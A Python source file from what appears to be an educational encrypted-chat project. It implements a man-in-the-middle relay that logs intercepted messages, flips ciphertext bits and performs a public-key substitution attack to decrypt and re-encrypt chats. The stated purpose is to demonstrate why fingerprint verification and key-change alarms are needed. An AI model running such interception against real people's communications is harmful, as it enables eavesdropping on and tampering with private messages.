"""mitm.py — a man-in-the-middle that sits between a client and the server (UC-2, UC-4).

It listens where clients expect the server, forwards every message to the real
server so the chat still works, and logs a copy of each one to intercepted.log.
In plain mode the log is readable; in e2ee mode it is only base64 ciphertext.

Modes:
  log        forward and record every message (UC-2; re-run against e2ee in UC-4)
  tamper     also flip one byte of every encrypted message's ciphertext (US-6)
  swap-keys  replace each side's public key with ours, so we can read the chat (US-7)

swap-keys is the demo that proves encryption alone is not enough: the fix is the
out-of-band fingerprint check and the key-change alarm in UC-5.

Run it with:  python -m e2ee_chat.mitm [--mode log|tamper|swap-keys] [--port 6060]
              [--server-host 127.0.0.1] [--server-port 5050]

Attack code, for our own app on our own machines only.
"""

import argparse
import base64
import binascii
import socket
import threading
from datetime import datetime

from e2ee_chat.crypto_utils import (
    IntegrityError,
    chat_aad,
    decrypt_message,
    derive_session_key,
    encrypt_message,
    generate_keypair,
    public_key_b64,
)
from e2ee_chat.protocol import (
    BadMessage,
    ProtocolError,
    port_number,
    recv_msg,
    send_msg,
)

LISTEN_HOST = "127.0.0.1"  # this machine
LISTEN_PORT = 6060  # where clients connect, thinking it's the server
SERVER_HOST = "127.0.0.1"  # the real server
SERVER_PORT = 5050  # the real server's port
LOG_FILE = "intercepted.log"
MODES = ("log", "tamper", "swap-keys")

# Tampering happens on the way IN to the server only. When both clients sit
# behind this MITM, every message passes through it twice (sender->server and
# server->recipient); flipping the same bit both times would undo the change.
TAMPER_DIRECTION = "client->server"

# One lock shared by every thread so two directions never interleave a log line.
_log_lock = threading.Lock()


def log_message(log_file, direction, msg):
    """Write one intercepted message to the log file and print it on screen."""
    timestamp = datetime.now().strftime("%H:%M:%S")
    line = f"[{timestamp}] {direction} {msg}"
    with _log_lock:
        print("[mitm]", line)  # show it in the attacker's terminal
        # utf-8 + errors="replace": chat text is free-form (emoji, non-Latin), and
        # without this the default Windows cp1252 codec raises on the first such
        # character and we'd lose that message and every one after it.
        with open(log_file, "a", encoding="utf-8", errors="replace") as f:
            f.write(line + "\n")


def tamper(msg):
    """Return a copy of an encrypted message with one ciphertext byte flipped.

    The attacker can't read the ciphertext, but it can still change it. AES-GCM's
    authentication tag is what lets the recipient notice (US-6). Anything that
    isn't a well-formed encrypted message is returned unchanged.
    """
    if msg.get("type") != "encrypted" or not isinstance(msg.get("ciphertext"), str):
        return msg
    try:
        raw = bytearray(base64.b64decode(msg["ciphertext"], validate=True))
    except (binascii.Error, ValueError):
        return msg
    if not raw:
        return msg
    raw[0] ^= 0x01  # flip a single bit of the first ciphertext byte
    return {**msg, "ciphertext": base64.b64encode(bytes(raw)).decode("ascii")}


class KeySwapper:
    """The key-substitution attack (US-7): hand each side our public key.

    When nobody checks fingerprints, the two clients each end up sharing a key
    with us instead of with each other. We decrypt what the sender sends,
    re-encrypt it for the recipient, and both sides still see "secure session
    ready". This is exactly what fingerprint verification and the key-change
    alarm are built to catch; see docs/uc5-walkthrough.md.

    Our keypair is generated in memory and never saved. One instance is shared
    by every connection thread, so state is guarded by a lock.
    """

    def __init__(self):
        self._priv = generate_keypair()
        self.pub_b64 = public_key_b64(self._priv)
        self._lock = threading.Lock()
        self._key_with: dict[str, bytes] = {}  # username -> AES key we share with them

    def note_pubkey(self, user, real_pub_b64):
        """Learn a user's real public key and derive the key we'll share with them."""
        if not isinstance(user, str):
            return  # a non-string username can't be a dict key
        try:
            key = derive_session_key(self._priv, real_pub_b64)
        except Exception:  # noqa: BLE001 - a malformed key just isn't swappable
            return
        with self._lock:
            self._key_with[user] = key

    def _key(self, user):
        with self._lock:
            return self._key_with.get(user)

    def rewrite(self, msg, sender, log_file):
        """Rewrite one client->server frame. Returns the frame to forward on.

        pubkey: replace the real key with ours. encrypted: decrypt with the key
        we share with the sender, log the plaintext, re-encrypt for the
        recipient. Anything we can't handle is forwarded unchanged.
        """
        kind = msg.get("type")
        # Fields come straight off the wire, so a hostile/garbled frame could put
        # a list or number where a username goes. Anything non-string can't be a
        # dict key, so bail out and forward it untouched rather than crash the pump.
        if not isinstance(sender, str):
            return msg
        if kind == "pubkey" and isinstance(msg.get("key"), str):
            self.note_pubkey(sender, msg["key"])
            return {**msg, "key": self.pub_b64}
        if kind == "encrypted":
            recipient = msg.get("to")
            if not isinstance(recipient, str):
                return msg
            sender_key = self._key(sender)
            recipient_key = self._key(recipient)
            if sender_key is None or recipient_key is None:
                return msg  # we don't hold both keys yet; can't read it, pass it on
            try:
                text = decrypt_message(
                    sender_key, msg.get("nonce"), msg.get("ciphertext"), chat_aad(sender, recipient)
                )
            except IntegrityError:
                return msg
            log_message(log_file, f"DECRYPTED {sender}->{recipient}:", text)
            nonce, ciphertext = encrypt_message(recipient_key, text, chat_aad(sender, recipient))
            return {**msg, "nonce": nonce, "ciphertext": ciphertext}
        return msg


def pump(source, destination, direction, log_file, mode="log", swapper=None, names=None):
    """Read messages from source, log them, and pass them to destination.

    Runs until one side hangs up or the stream breaks. One pump handles one
    direction; we run two so both directions flow at once. Any socket or
    protocol error just ends this direction cleanly instead of crashing the
    thread, and handle_client() closes both sockets afterwards.
    """
    try:
        while True:
            msg = recv_msg(source)
            if msg is None:  # the other side closed cleanly
                break
            log_message(log_file, direction, msg)
            if direction == TAMPER_DIRECTION:
                if names is not None and msg.get("type") == "register":
                    names["user"] = msg.get("username")  # this client's name
                if mode == "tamper":
                    altered = tamper(msg)
                    if altered is not msg:
                        log_message(log_file, f"{direction} TAMPERED", altered)
                        msg = altered
                elif mode == "swap-keys" and swapper is not None:
                    msg = swapper.rewrite(msg, names.get("user") if names else None, log_file)
            send_msg(destination, msg)
    except (OSError, ProtocolError, BadMessage):
        # A reset connection, a half-closed socket, or a malformed frame.
        # Nothing to recover: let this direction end and fall through to cleanup.
        pass


def handle_client(client_sock, server_host, server_port, log_file, mode="log", swapper=None):
    """One client connected to us. Connect to the real server and relay both ways."""
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server_sock.connect((server_host, server_port))
    except OSError as exc:
        print(f"[mitm] cannot reach the real server at {server_host}:{server_port}: {exc}")
        client_sock.close()
        server_sock.close()
        return

    # Shared per-client box so the client->server pump can record this
    # connection's registered username for the key-swap rewrite.
    names: dict = {}
    # Forward client->server in the background; server->client in this thread.
    up = threading.Thread(
        target=pump,
        args=(client_sock, server_sock, "client->server", log_file, mode, swapper, names),
        daemon=True,
    )
    up.start()
    pump(server_sock, client_sock, "server->client", log_file, mode, swapper, names)

    # When either direction ends, close both sockets. Closing them makes the
    # other pump's blocked recv return, so no thread or socket is left dangling
    # and the real server sees the client leave (freeing the username).
    for sock in (client_sock, server_sock):
        try:
            sock.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass
        sock.close()


def main(argv=None):
    parser = argparse.ArgumentParser(description="E2EE Chat man-in-the-middle (UC-2, UC-4)")
    parser.add_argument("--host", default=LISTEN_HOST, help="address to listen on")
    parser.add_argument(
        "--port",
        type=port_number,
        default=LISTEN_PORT,
        help="port clients connect to (defaults to 6060)",
    )
    parser.add_argument("--server-host", default=SERVER_HOST, help="the real server's address")
    parser.add_argument(
        "--server-port", type=port_number, default=SERVER_PORT, help="the real server's port"
    )
    parser.add_argument(
        "--mode",
        choices=MODES,
        default="log",
        help="log: forward and record every message; "
        "tamper: also flip one byte of each encrypted message; "
        "swap-keys: substitute our own public keys and read the chat (US-7)",
    )
    parser.add_argument("--log-file", default=LOG_FILE, help="where to write intercepted traffic")
    args = parser.parse_args(argv)

    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind((args.host, args.port))
    listener.listen()
    # One shared swapper holds the attacker's keypair and the keys it shares
    # with each client, across all connection threads (swap-keys only).
    swapper = KeySwapper() if args.mode == "swap-keys" else None
    print(
        f"[mitm] mode={args.mode} listening on {args.host}:{args.port}, "
        f"forwarding to {args.server_host}:{args.server_port}"
    )

    try:
        while True:
            client_sock, addr = listener.accept()
            print(f"[mitm] client connected from {addr}")
            threading.Thread(
                target=handle_client,
                args=(
                    client_sock,
                    args.server_host,
                    args.server_port,
                    args.log_file,
                    args.mode,
                    swapper,
                ),
                daemon=True,
            ).start()
    except KeyboardInterrupt:
        print("\n[mitm] stopping")
    finally:
        listener.close()


if __name__ == "__main__":
    main()
